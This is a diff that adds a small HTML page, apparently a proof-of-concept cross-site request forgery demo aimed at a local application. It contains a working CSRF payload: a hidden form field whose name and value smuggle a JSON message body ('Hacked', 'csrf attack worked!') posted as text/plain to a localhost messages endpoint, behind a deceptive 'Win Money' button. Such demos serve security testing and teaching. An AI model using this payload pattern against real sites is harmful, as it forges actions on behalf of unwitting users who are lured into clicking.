@@ -1,0 +1,11 @@
+<html>
+    <head>
+        <title>CSRF</title>
+    </head>
+    <body>
+        <form action="http://localhost:8080/csrf/messages/" method="post" enctype="text/plain">
+            <input name='{"to":"http://localhost:8080/users/1","from":"http://localhost:8080/users/0","summary":"Hacked","text":"csrf attack worked!","ignore_me":"' value='test"}' type="hidden">
+            <input type="submit" value="Win Money"/>
+        </form>
+    </body>
+</html>
